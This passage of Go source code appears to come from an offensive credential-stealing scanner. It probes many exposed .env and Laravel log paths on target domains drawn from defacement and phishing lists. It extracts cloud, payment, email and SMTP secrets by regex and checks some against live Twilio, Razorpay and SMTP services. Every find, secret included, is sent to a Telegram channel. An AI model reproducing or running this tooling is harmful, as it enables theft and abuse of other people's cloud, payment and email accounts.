    "brevo":     regexp.MustCompile(`xkeysib-[a-zA-Z0-9_-]{50,}`),
    "razorpay":  regexp.MustCompile(`rzp_(test|live)_[a-zA-Z0-9]{14,20}`),
	
}

var emailPatterns = []*regexp.Regexp{
    regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`),
    regexp.MustCompile(`(?i)(?:noreply|no-reply|info|contact|support|admin|hello|sales|billing|help|service|notification|alert|system|mailer|postmaster|webmaster)@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`),
}

var postmarkPattern = regexp.MustCompile(`[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}`)
var mailjetPattern = regexp.MustCompile(`[a-f0-9]{32}`)
var sparkpostPattern = regexp.MustCompile(`[a-f0-9]{40}`)
var elasticemailPattern = regexp.MustCompile(`[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}`)


func scanText(text, url string) {
    if len(text) < 50 {
        return
    }
    

    text = strings.Map(func(r rune) rune {
        if r == '\n' || r == '\r' {
            return ' '
        }
        return r
    }, text)
    
    senderEmails := extractEmailsOptimized(text)
    globalSenderEmails := getGlobalSenderEmails(url)
    allSenderEmails := append(senderEmails, globalSenderEmails...)
    allSenderEmails = unique(allSenderEmails)
    
    var wg sync.WaitGroup
    resultChan := make(chan struct {
        category string
        data     string
        hasEmail bool
    }, 20)
    
    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := awsKeyPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, key := range matches {
                if secret := findAWSSecret(text); secret != "" {
                    data := fmt.Sprintf("%s|%s", key, secret)
                    if len(allSenderEmails) > 0 {
                        data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                    }
                    resultChan <- struct {
                        category string
                        data     string
                        hasEmail bool
                    }{"AWS_KEY", data, len(allSenderEmails) > 0}
                    if len(allSenderEmails) > 0 {
                        msg := fmt.Sprintf("☁️ *AWS Key Found!*\n🔑 Access Key: `%s`\n🔐 Secret: `%s`\n📧 Sender: `%s`\n🔗 URL: %s", 
                            key, secret, allSenderEmails[0], url)
                        go sendTelegramMessage(msg)
                    }
                } else {
                    resultChan <- struct {
                        category string
                        data     string
                        hasEmail bool
                    }{"AWS_KEY_ONLY", key, len(allSenderEmails) > 0}
                }
            }
        }
    }()
    
    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := sendGridPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, key := range matches {
                if len(allSenderEmails) > 0 {
                    data := key + "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                    resultChan <- struct {
                        category string
                        data     string
                        hasEmail bool
                    }{"SENDGRID", data, true}
                    msg := fmt.Sprintf("📧 *SendGrid Key Found!*\n🔑 Key: `%s`\n📧 Sender: `%s`\n🔗 URL: %s", 
                        key, allSenderEmails[0], url)
                    go sendTelegramMessage(msg)
                    
                    fmt.Printf("%s[SENDGRID VALID ✅] %s - Key: %s avec sender: %s\n", 
                        green(), url, key, allSenderEmails[0])
                } else {
                    storePendingSendGridKey(url, key)
                    fmt.Printf("%s[SENDGRID PENDING ⏳] %s - En attente d'email sender\n", 
                        yellow(), url)
                }
            }
        }
    }()

    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := stripePattern.FindAllString(text, -1); len(matches) > 0 {
            for _, key := range matches {
                data := key
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"STRIPE", data, len(allSenderEmails) > 0}
                
                msg := fmt.Sprintf("💳 *Stripe Key Found!*\n🔑 Key: `%s`\n🔗 URL: %s", key, url)
                go sendTelegramMessage(msg)
            }
        }
    }()
    

    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := brevoPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, key := range matches {
                data := key
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"BREVO", data, len(allSenderEmails) > 0}
                
                msg := fmt.Sprintf("📧 *Brevo Key Found!*\n🔑 Key: `%s`\n🔗 URL: %s", key, url)
                go sendTelegramMessage(msg)
            }
        }
    }()
    

    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := mailgunPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, key := range matches {
                data := key
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"MAILGUN", data, len(allSenderEmails) > 0}
                
                msg := fmt.Sprintf("📧 *Mailgun Key Found!*\n🔑 Key: `%s`\n🔗 URL: %s", key, url)
                go sendTelegramMessage(msg)
            }
        }
    }()
    

    wg.Add(1)
    go func() {
        defer wg.Done()
        sidMatches := twilioSIDPattern.FindAllString(text, -1)
        authMatches := twilioAuthPattern.FindAllString(text, -1)
        
        if len(sidMatches) > 0 && len(authMatches) > 0 {
            for i := 0; i < min(len(sidMatches), len(authMatches)); i++ {
                data := fmt.Sprintf("%s|%s", sidMatches[i], authMatches[i])
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"TWILIO", data, len(allSenderEmails) > 0}
                
                msg := fmt.Sprintf("📱 *Twilio Credentials Found!*\n🆔 SID: `%s`\n🔑 Auth: `%s`\n🔗 URL: %s", 
                    sidMatches[i], authMatches[i], url)
                go sendTelegramMessage(msg)
            }
        }
    }()
    

    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := githubTokenPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, token := range matches {
                data := token
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"GITHUB", data, len(allSenderEmails) > 0}
                
                msg := fmt.Sprintf("🐙 *GitHub Token Found!*\n🔑 Token: `%s`\n🔗 URL: %s", token, url)
                go sendTelegramMessage(msg)
            }
        }
    }()
    

    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := tencentKeyPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, key := range matches {
                data := key
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"TENCENT", data, len(allSenderEmails) > 0}
                
                msg := fmt.Sprintf("☁️ *Tencent Cloud Key Found!*\n🔑 Key: `%s`\n🔗 URL: %s", key, url)
                go sendTelegramMessage(msg)
            }
        }
    }()
    

    wg.Add(1)
    go func() {
        defer wg.Done()
        if matches := awsSMTPPattern.FindAllString(text, -1); len(matches) > 0 {
            for _, endpoint := range matches {
                data := endpoint
                if len(allSenderEmails) > 0 {
                    data += "|" + strings.Join(allSenderEmails[:min(3, len(allSenderEmails))], "|")
                }
                resultChan <- struct {
                    category string
                    data     string
                    hasEmail bool
                }{"AWS_SMTP", data, len(allSenderEmails) > 0}
            }
        }
    }()
    
    go func() {
        wg.Wait()
        close(resultChan)
    }()
    
    for result := range resultChan {
        saveResultToFile(result.category, result.data, url)
        addResult(result.category, url, result.data)
    }
    
    scanSMTPPatterns(text, url, allSenderEmails)
}


func extractEmailsOptimized(text string) []string {
    senderEmailPattern := regexp.MustCompile(`(?i)(?:` +
        `(?:from|sender|mail_from|email_from|from_email|sender_email|reply_to|return_path|envelope_from|` +
        `MAIL_FROM|SENDER|FROM_EMAIL|SENDGRID_FROM|SES_FROM|AWS_SES_FROM|MAILGUN_FROM|BREVO_FROM|` +
        `SMTP_FROM|SMTP_USER|MAIL_USERNAME|EMAIL_USERNAME|` +
        `noreply|no-reply|no_reply|noreplay|no.reply|noReply|NoReply|` +
        `contact|support|admin|info|hello|sales|billing|notification|alert|system|mailer|postmaster|webmaster|` +
        `newsletter|marketing|team|hello|help|service|noreply-|no-reply-|donotreply|do-not-reply)` +
        `[\s]*[:=][\s]*` +
        `['"]?([a-zA-Z0-9._%+\-!#$&'*/=?^{|}~]+@[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)+)['"]?` +
        `)|` +
        `([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})`)
    
    sendgridSenderPattern := regexp.MustCompile(`(?i)(?:` +
        `SENDGRID_FROM|sendgrid_from|sendgrid_email|sg_from|` +
        `"from".*?sendgrid|sendgrid.*?"from"|` +
        `from_email.*?sendgrid|sendgrid.*?from_email|` +
        `"sender".*?sendgrid|sendgrid.*?"sender"` +
        `)[\s]*[:=][\s]*['"]?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})['"]?`)
    
    noreplyPattern := regexp.MustCompile(`(?i)(?:` +
        `["']?(?:noreply|no-reply|no_reply|noreplay|no\.reply|noReply|NoReply|donotreply|do-not-reply)` +
        `(?:@|\+)?[a-zA-Z0-9._%+\-]*@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}|` +
        `[a-zA-Z0-9._%+\-]*@[a-zA-Z0-9.\-]*\.?(?:noreply|no-reply|no_reply)[a-zA-Z0-9.\-]*\.[a-zA-Z]{2,}|` +
        `(?:noreply|no-reply|no_reply|donotreply)[\s]*[:=][\s]*['"]?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})` +
        `)`)
    
    envEmailPattern := regexp.MustCompile(`(?i)^[\s]*(?:` +
        `MAIL_FROM|FROM_EMAIL|SENDER_EMAIL|SENDGRID_FROM|SES_FROM|` +
        `SMTP_FROM|EMAIL_FROM|MAILER_FROM|DEFAULT_FROM|` +
        `CONTACT_EMAIL|ADMIN_EMAIL|SUPPORT_EMAIL|INFO_EMAIL|` +
        `NOREPLY_EMAIL|NO_REPLY_EMAIL` +
        `)[\s]*=[\s]*['"]?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})['"]?`)
    
    jsonEmailPattern := regexp.MustCompile(`"(?:from|sender|email|fromEmail|senderEmail|mail_from|noreply|no-reply)"\s*:\s*"([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})"`)
    commentEmailPattern := regexp.MustCompile(`<!--.*?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}).*?-->`)
    

    patterns := []*regexp.Regexp{
        sendgridSenderPattern,
        noreplyPattern, 
        senderEmailPattern, 
        envEmailPattern, 
        jsonEmailPattern, 
        commentEmailPattern, 
        regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`),
    }
    
    seen := make(map[string]bool)
    emails := make([]string, 0)
    

    blacklist := map[string]bool{
        "example.com": true, "test.com": true, "domain.com": true, 
        "yourdomain.com": true, "localhost": true, "email.com": true,
        "mail.com": true, "user.com": true, "site.com": true,
        "mysite.com": true, "yoursite.com": true, "example.org": true,
        "facebook.com": true, "twitter.com": true, 
    }
    

    for _, pattern := range patterns {
        matches := pattern.FindAllStringSubmatch(text, -1)
        for _, match := range matches {
            var email string
            for i := 1; i < len(match); i++ {
                if match[i] != "" {
                    email = strings.ToLower(strings.TrimSpace(match[i]))
                    break
                }
            }
            if email == "" {
                continue
            }
            
            email = strings.Trim(email, "\"' .,;:")
            
            if !strings.Contains(email, "@") || len(email) > 100 {
                continue
            }
            
            parts := strings.Split(email, "@")
            if len(parts) != 2 {
                continue
            }
            domain := parts[1]
            
            if blacklist[domain] || seen[email] {
                continue
            }
            
            if strings.Contains(domain, "example") || 
               strings.Contains(domain, "test") || 
               strings.Contains(domain, "localhost") ||
               strings.Contains(domain, "domain") ||
               strings.Count(domain, ".") < 1 {
                continue
            }
            
            seen[email] = true
            
            if strings.Contains(email, "noreply") || strings.Contains(email, "no-reply") {
                emails = append([]string{email}, emails...)
            } else if strings.Contains(email, "sendgrid") {
                emails = append([]string{email}, emails...) 
            } else {
                emails = append(emails, email)
            }
        }
    }
    
    return emails
}

func findAWSSecret(text string) string {
    secretPatterns := []*regexp.Regexp{
        regexp.MustCompile(`(?i)(?:aws_secret_access_key|secret_access_key|aws_secret)\s*[:=]\s*["']?([A-Za-z0-9/+=]{40})["']?`),
        regexp.MustCompile(`["']([A-Za-z0-9/+=]{40})["']`),
    }
    
    for _, pattern := range secretPatterns {
        if matches := pattern.FindStringSubmatch(text); len(matches) > 1 {
            if len(matches[1]) == 40 {
                return matches[1]
            }
        }
    }
    return ""
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}



func scanSMTPPatterns(text, url string, senderEmails []string) {
    hostPatterns := []*regexp.Regexp{
        regexp.MustCompile(`"(?:smtp_host|host|mail_host|SMTP_HOST|MAIL_HOST|EMAIL_HOST|MAILER_HOST|MAIL_SERVER|SMTP_SERVER|email_host|mailer_host|mailServer|smtpServer)"\s*[:=]\s*["']?([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`(?:SMTP_HOST|MAIL_HOST|EMAIL_HOST|MAILER_HOST|MAIL_SERVER|SMTP_SERVER|smtp\.host|mail\.server)\s*[:=]\s*["']?([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`(?i)(?:transport|mailer).*?host['":\s]+["']?([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`smtp[._\-]?(?:host|server)['":\s]+["']?([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`["']?(smtp\.[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`["']?(mail\.[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`["']?([a-zA-Z0-9.\-]*(?:mailgun|sendgrid|ses|postmark|mailjet|sparkpost|sendinblue|brevo|mandrill|pepipost|elasticemail)[a-zA-Z0-9.\-]*\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`(?i)(?:outgoing|relay|gateway)[._\-]?(?:mail|smtp)[._\-]?(?:host|server)?['":\s]+["']?([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
    }
    portPatterns := []*regexp.Regexp{
        regexp.MustCompile(`"(?:smtp_port|port|mail_port|SMTP_PORT|MAIL_PORT|EMAIL_PORT|MAILER_PORT)"\s*[:=]\s*["']?(\d{2,5})["']?`),
        regexp.MustCompile(`(?:SMTP_PORT|MAIL_PORT|EMAIL_PORT|smtp\.port|mail\.port)\s*[:=]\s*["']?(\d{2,5})["']?`),
        regexp.MustCompile(`(?i)(?:mail|smtp)[._\-]?port['":\s]+["']?(\d{2,5})["']?`),
    }
    userPatterns := []*regexp.Regexp{
        regexp.MustCompile(`"(?:smtp_user|smtp_username|mail_username|SMTP_USER|SMTP_USERNAME|MAIL_USERNAME|EMAIL_USER|EMAIL_USERNAME|MAILER_USER|MAILER_USERNAME|smtp_login|mail_user)"\s*[:=]\s*["']?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._%+\-]{3,})["']?`),
        regexp.MustCompile(`(?:SMTP_USER|SMTP_USERNAME|MAIL_USERNAME|EMAIL_USER|smtp\.user|mail\.user|smtp\.username)\s*[:=]\s*["']?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._%+\-]{3,})["']?`),
        regexp.MustCompile(`(?i)(?:smtp|mail)[._\-]?(?:username|user|login)['":\s]+["']?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`(?i)auth.*?(?:user|login)['":\s]+["']?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
        regexp.MustCompile(`(?i)credentials.*?(?:user|email)['":\s]+["']?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["']?`),
    }
    passPatterns := []*regexp.Regexp{
        regexp.MustCompile(`"(?:smtp_pass|smtp_password|mail_password|SMTP_PASSWORD|MAIL_PASSWORD|EMAIL_PASSWORD|MAILER_PASSWORD|smtp_secret|mail_secret)"\s*[:=]\s*["']([^"'\n\r]{4,128})["']`),
        regexp.MustCompile(`(?:SMTP_PASSWORD|SMTP_PASS|MAIL_PASSWORD|EMAIL_PASSWORD|smtp\.password|mail\.password)\s*[:=]\s*["']([^"'\n\r]{4,128})["']`),
        regexp.MustCompile(`(?i)(?:smtp|mail)[._\-]?(?:password|passwd|pass|secret|pwd)['":\s]+["']([^"'\n\r]{4,128})["']`),
        regexp.MustCompile(`(?i)auth.*?(?:password|pass|secret|key)['":\s]+["']([^"'\n\r]{4,128})["']`),
        regexp.MustCompile(`(?i)credentials.*?(?:password|secret|key)['":\s]+["']([^"'\n\r]{4,128})["']`),
    }

    var allHosts, allUsers, allPasses []string
    var allPorts []int
    seenH, seenU, seenP := make(map[string]bool), make(map[string]bool), make(map[string]bool)

    for _, p := range hostPatterns {
        for _, m := range p.FindAllStringSubmatch(text, -1) {
            if len(m) > 1 {
                val := strings.TrimSpace(m[1])
                if !isInvalidValue(val) && !seenH[val] {
                    seenH[val] = true
                    allHosts = append(allHosts, val)
                }
            }
        }
    }
    for _, p := range portPatterns {
        for _, m := range p.FindAllStringSubmatch(text, -1) {
            if len(m) > 1 {
                port, _ := strconv.Atoi(m[1])
                if port > 0 && port < 65536 {
                    allPorts = append(allPorts, port)
                }
            }
        }
    }
    if len(allPorts) == 0 {
        allPorts = []int{587, 465, 25}
    }
    for _, p := range userPatterns {
        for _, m := range p.FindAllStringSubmatch(text, -1) {
            if len(m) > 1 {
                val := strings.TrimSpace(m[1])
                if !isInvalidValue(val) && !seenU[val] && strings.Contains(val, "@") {
                    seenU[val] = true
                    allUsers = append(allUsers, val)
                }
            }
        }
    }
    for _, p := range passPatterns {
        for _, m := range p.FindAllStringSubmatch(text, -1) {
            if len(m) > 1 {
                val := strings.TrimSpace(m[1])
                if !isInvalidValue(val) && !seenP[val] && len(val) >= 4 {
                    seenP[val] = true
                    allPasses = append(allPasses, val)
                }
            }
        }
    }

    if len(allHosts) == 0 || len(allUsers) == 0 || len(allPasses) == 0 {
        return
    }

    for _, host := range allHosts {
        for _, user := range allUsers {
            for _, pass := range allPasses {
                for _, port := range allPorts {
                    smtpResult := fmt.Sprintf("%s|%d|%s|%s", host, port, user, pass)
                    for _, sender := range senderEmails {
                        smtpResult += "|" + sender
                    }
                    if validateSMTP(host, port, user, pass) {
                        addResult("VALID SMTP", url, smtpResult)
                        saveResultToFile("smtp_valid", smtpResult, url)
                        fmt.Printf("%s[SMTP VALID ✅] %s -> %s\n", green(), url, smtpResult)
                        msg := fmt.Sprintf("✉️ *SMTP Valid!*\n\n🖥️ Host: `%s`\n🔌 Port: %d\n👤 User: `%s`\n🔑 Pass: `%s`", host, port, user, pass)
                        for i, sender := range senderEmails {
                            if i < 5 {
                                msg += fmt.Sprintf("\n📧 Sender %d: `%s`", i+1, sender)
                            }
                        }
                        msg += fmt.Sprintf("\n🔗 URL: %s", url)
                        sendTelegramMessage(msg)
                        return
                    }
                }
            }
        }
    }

    for _, host := range allHosts {
        for _, user := range allUsers {
            for _, pass := range allPasses {
                smtpResult := fmt.Sprintf("%s|587|%s|%s", host, user, pass)
                for _, sender := range senderEmails {
                    smtpResult += "|" + sender
                }
                addResult("INVALID SMTP", url, smtpResult)
                saveResultToFile("smtp_invalid", smtpResult, url)
                fmt.Printf("%s[SMTP INVALID ❌] %s -> %s\n", red(), url, smtpResult)
            }
        }
    }
}


func isInvalidValue(value string) bool {
    if value == "" || len(value) < 3 {
        return true
    }
    upper := strings.ToUpper(value)
    invalid := []string{"NULL", "UNDEFINED", "EXAMPLE", "TEST", "DEMO", "LOCALHOST", "127.0.0.1", "CHANGE_ME", "SECRET"}
    for _, inv := range invalid {
        if strings.Contains(upper, inv) {
            return true
        }
    }
    return false
}

var processedSendGridDomains = make(map[string]bool)

func extractDomainFromURL(url string) string {
    u, err := neturl.Parse(url)
    if err != nil {
        return ""
    }
    return u.Hostname()
}

var processedDomains = make(map[string]bool)

func extractAWSCredentials(text, url string) {
    akiaPattern := regexp.MustCompile(`(AKIA[0-9A-Z]{16})`)
    secretKeyPattern := regexp.MustCompile(`(?i)(?:aws_secret_access_key|secret_access_key|aws_secret|aws_secret_key|secretkey)\s*[:=]\s*["']?([A-Za-z0-9/+=]{40})["']?|([A-Za-z0-9/+=]{40})`)
    regionPattern := regexp.MustCompile(`(?i)AWS_(?:DEFAULT_REGION|REGION|REG|AWS_REGIONAL|COUNTRY)["']?\s*[:=]\s*["']?([a-z0-9-]+)["']?`)

    akiaMatches := akiaPattern.FindAllStringSubmatch(text, -1)
    secretMatches := secretKeyPattern.FindAllStringSubmatch(text, -1)
    regionMatches := regionPattern.FindAllStringSubmatch(text, -1)

    if len(akiaMatches) == 0 {
        return
    }

    region := "us-east-1"
    if len(regionMatches) > 0 && len(regionMatches[0]) > 1 {
        region = regionMatches[0][1]
    }

	for i := range akiaMatches {
		accessKey := akiaMatches[i][1]
		var secretKey string
		
		if i < len(secretMatches) {
			if len(secretMatches[i]) > 1 && secretMatches[i][1] != "" {
				secretKey = secretMatches[i][1]
			} else if len(secretMatches[i]) > 2 && secretMatches[i][2] != "" {
				secretKey = secretMatches[i][2]
			}
		}

		domain := extractDomainFromURL(url)
		if _, processed := processedDomains[domain]; processed {
			continue
		}

		processedDomains[domain] = true

		if secretKey == "" {
			msg := fmt.Sprintf("☁️ *AWS Access Key Found!*\n\n🔑 Access Key: `%s`\n🔗 URL: %s\n\n*Please find the Secret Key manually.*", accessKey, url)
			sendTelegramMessage(msg)
		} else {
			combined := fmt.Sprintf("%s|%s", accessKey, secretKey)
			addResult("AWS_CREDENTIALS", url, combined)
			saveResultToFile("aws_credentials", combined, url)
			msg := fmt.Sprintf("☁️ *AWS Credentials Found!*\n\n🔑 Access Key: `%s`\n🔐 Secret Key: `%s`\n🌍 Region: %s\n🔗 URL: %s", accessKey, secretKey, region, url)
			sendTelegramMessage(msg)
		}
	}

}

func sha256Hash(data string) string {
    hash := sha256.Sum256([]byte(data))
    return hex.EncodeToString(hash[:])
}

func hmacSHA256(key []byte, data string) []byte {
    h := hmac.New(sha256.New, key)
    h.Write([]byte(data))
    return h.Sum(nil)
}

func extractXMLValue(xml, tag string) string {
    start := strings.Index(xml, "<"+tag+">")
    end := strings.Index(xml, "</"+tag+">")
    if start == -1 || end == -1 {
        return "0"
    }
    return xml[start+len(tag)+2 : end]
}

func extractTwilioCredentials(text, url string) {
    sidPattern := regexp.MustCompile(`AC[a-f0-9]{32}`)
    tokenPattern := regexp.MustCompile(`SK[a-f0-9]{32}`)
    sid := sidPattern.FindString(text)
    token := tokenPattern.FindString(text)
    if sid != "" && token != "" {
        go validateTwilioCredentials(sid, token, url)
    }
}

func validateTwilioCredentials(sid, token, url string) {
    client := &http.Client{Timeout: 10 * time.Second}
    req, err := http.NewRequest("GET", fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s.json", sid), nil)
    if err != nil {
        addResult("TWILIO", url, fmt.Sprintf("sid:%s|token:%s", sid, token))
        saveResultToFile("twilio", fmt.Sprintf("%s|%s|%s", sid, token, url), "")
        return
    }
    req.SetBasicAuth(sid, token)
    
    resp, err := client.Do(req)
    if err != nil {
        addResult("TWILIO", url, fmt.Sprintf("sid:%s|token:%s", sid, token))
        saveResultToFile("twilio", fmt.Sprintf("%s|%s|%s", sid, token, url), "")
        return
    }
    defer resp.Body.Close()
    
    if resp.StatusCode == 200 {
        body, _ := io.ReadAll(resp.Body)
        var data map[string]interface{}
        json.Unmarshal(body, &data)
        
        status := "unknown"
        if s, ok := data["status"].(string); ok {
            status = s
        }
        
        result := fmt.Sprintf("%s|%s|status:%s", sid, token, status)
        addResult("VALID TWILIO", url, result)
        saveResultToFile("twilio_valid", result, url)
        fmt.Printf("%s[Twilio VALID ✅] %s - SID: %s Status: %s\n", green(), url, sid, status)
        msg := fmt.Sprintf("📱 *Twilio Valid!*\n\n🆔 SID: `%s`\n🔑 Token: `%s`\n📊 Status: %s\n🔗 URL: %s", sid, token, status, url)
        sendTelegramMessage(msg)
    } else {
        addResult("INVALID TWILIO", url, fmt.Sprintf("sid:%s|token:%s", sid, token))
        fmt.Printf("%s[Twilio INVALID ❌] %s - %s\n", red(), url, sid)
    }
}

func validateMandrillKey(key, url string) bool {
    if len(key) < 20 || len(key) > 35 {
        return false
    }
    validPattern := regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)
    if !validPattern.MatchString(key) {
        return false
    }
    
    if strings.Contains(key, "AAAA") || strings.Contains(key, "AAAAA") {
        return false
    }
    if len(key) > 30 && (strings.Contains(strings.ToLower(url), ".png") || 
                         strings.Contains(strings.ToLower(url), ".jpg") ||
                         strings.Contains(strings.ToLower(url), ".gif") ||
                         strings.Contains(strings.ToLower(url), ".css") ||
                         strings.Contains(strings.ToLower(url), ".js")) {
        return false
    }
    
    addResult("MANDRILL", url, key)
    saveResultToFile("mandrill", fmt.Sprintf("%s|%s", key, url), "")
    msg := fmt.Sprintf("📬 *Mandrill Key Found!*\n\n🔑 Key: `%s`\n🔗 URL: %s", key, url)
    sendTelegramMessage(msg)
    return true
}

func validateRazorpayKey(key, url string) bool {
    client := &http.Client{Timeout: 10 * time.Second}
    req, err := http.NewRequest("GET", "https://api.razorpay.com/v1/payments?count=1", nil)
    if err != nil {
        addResult("RAZORPAY", url, key)
        saveResultToFile("razorpay", fmt.Sprintf("%s|%s", key, url), "")
        return true
    }
    req.SetBasicAuth(key, "")
    
    resp, err := client.Do(req)
    if err != nil {
        addResult("RAZORPAY", url, key)
        saveResultToFile("razorpay", fmt.Sprintf("%s|%s", key, url), "")
        return true
    }
    defer resp.Body.Close()
    
    if resp.StatusCode == 200 || resp.StatusCode == 401 {
        if resp.StatusCode == 200 {
            addResult("VALID RAZORPAY", url, key)
            saveResultToFile("razorpay_valid", fmt.Sprintf("%s|%s", key, url), "")
            fmt.Printf("%s[Razorpay VALID ✅] %s - %s\n", green(), url, key)
            msg := fmt.Sprintf("💳 *Razorpay Valid!*\n\n🔑 Key: `%s`\n🔗 URL: %s", key, url)
            sendTelegramMessage(msg)
        } else {
            addResult("INVALID RAZORPAY", url, key)
            fmt.Printf("%s[Razorpay INVALID ❌] %s - %s\n", red(), url, key)
        }
    }
    return true
}

func saveResultToFile(category, data, url string) {
    dir := filepath.Join("results", category)
    os.MkdirAll(dir, 0755)
    filename := filepath.Join(dir, fmt.Sprintf("%s.txt", category))
    content := data
    if url != "" {
        content = fmt.Sprintf("%s|%s", data, url)
    }
    appendFile(filename, content)
}



func runGrabber(source string) {
    grabberRunning = true
    grabberStopped = false
    grabberLock.Lock()
    grabberDomains = []string{}
    grabberLock.Unlock()

    var domains []string

    switch source {
    case "haxor":
        domains = haxorIDGrab()
    case "zonexsec":
        domains = zoneXsecGrab()
    case "phishing":
        domains = phishingTankGrab()
    case "mirrorh":
        domains = mirrorHGrab()
    }

    grabberLock.Lock()
    grabberDomains = unique(domains)
    grabberRunning = false
    grabberLock.Unlock()

    fmt.Printf("[*] Grabber finished - %d domains found\n", len(grabberDomains))
}

var laravelPaths = []string{
    "/.env",
    "/.env.local",
    "/.env.dev",
    "/.env.example",
    "/.env.bak",
    "/.env.old",
    "/wp-content/.env",
    "/src/config/.env",
    "/app/.env",
    "/config/.env",
    "/api/.env",
    "/laravel/.env",
    "/lib/.env",
    "/backend/.env",
    "/react-app/.env",
    "/frontend/.env",
    "/cgi-bin/.env",
    "/src/.env",
    "/core/.env",
    "/sources/.env",
    "/api/shared/config/config.env",
    "/storage/logs/laravel.log",
    "/app/storage/logs/laravel.log",
    "/logs/laravel.log",
    "/laravel.log",
    "/server/config/.env",
    "/vendor/.env",
    "/lab/.env",
    "/cronlab/.env",
    "/cron/.env",
    "/core/app/.env",
    "/core/Datavase/.env",
    "/database/.env",
    "/assets/.env",
    "/apps/.env",
    "/uploads/.env",
    "/sitemaps/.env",
    "/saas/.env",
    "/exapi/.env",
    "/site/.env",
    "/admin/.env",
    "/web/.env",
    "/public/.env",
    "/en/.env",
    "/tools/.env",
    "/v1/.env",
    "/v2/.env",
    "/administrator/.env",
    "/storage/.env",
    "/tests/test-become/.env",
    "/redmine/.env",
    "/main/.env",
    "/docs/.env",
    "/client/.env",
    "/blog/.env",
    "/blogs/.env",
    "/shared/.env",
    "/download/.env",
    "/sites/.env",
    "/beta/.env",
    "/kyc/.env",
    "/prod/.env",
    "/.docker/laravel/app/.env",
    "/.docker/.env",
    "/.gitlab-ci/.env",
    "/.vscode/.env",
    "/crm/.env",
    "/local/.env",
    "/application/.env",
    "/admin-app/.env",
    "/mailer/.env",
    "/.env.project",
    "/development/.env",
    "/.env.config",
    "/.env-example",
    "/.env-sample",
    "/.env.backup",
    "/.env.dev.local",
    "/.env.development.local",
